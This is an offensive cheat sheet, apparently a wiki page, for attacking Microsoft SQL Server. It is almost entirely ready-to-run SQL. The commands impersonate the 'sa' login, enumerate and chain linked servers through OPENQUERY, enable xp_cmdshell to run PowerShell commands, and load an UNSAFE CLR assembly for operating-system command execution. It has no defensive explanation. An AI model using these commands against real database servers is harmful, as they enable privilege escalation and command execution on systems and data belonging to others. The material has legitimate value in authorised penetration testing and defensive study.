# MSSQL attacks

## MSSQL attacks

### Impersonation 

#### List impersonation account

```csharp
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```

### Login As

```csharp
EXECUTE AS LOGIN = 'sa'
```

### RPC out

#### Enumeration

```csharp
select * from master..sysservers
```

![](../../../../.gitbook/assets/image%20%2887%29.png)

### Database Links

```csharp
select * from openquery("SERVER01", 'select * from master..sysservers')
```

```csharp
select * from openquery("sql1",'select * from openquery("server2",''select * from openquery("server3",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')
```

### XP\_cmdshell Stored Procedures

#### Give me shell

```csharp
EXECUTE AS LOGIN = 'sa'
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
exec master..xp_cmdshell "powershell ls /"
```

![](../../../../.gitbook/assets/image%20%2847%29.png)

### Custom Assemblies

```text
EXECUTE AS LOGIN = 'sa';
USE msdb;  EXEC sp_configure 'show advanced options',1 ; RECONFIGURE ;
EXEC sp_configure 'clr enabled',1; RECONFIGURE ;
EXEC sp_configure 'clr strict security', 0; RECONFIGURE ;
DROP PROCEDURE IF EXISTS dbo.cmdExec ;
DROP ASSEMBLY IF EXISTS myAssembly;
CREATE ASSEMBLY myAssembly FROM 'c:\tools\cmdExec.dll' WITH PERMISSION_SET = UNSAFE;
CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];
EXEC cmdExec 'whoami';
```

![](../../../../.gitbook/assets/image%20%28116%29.png)

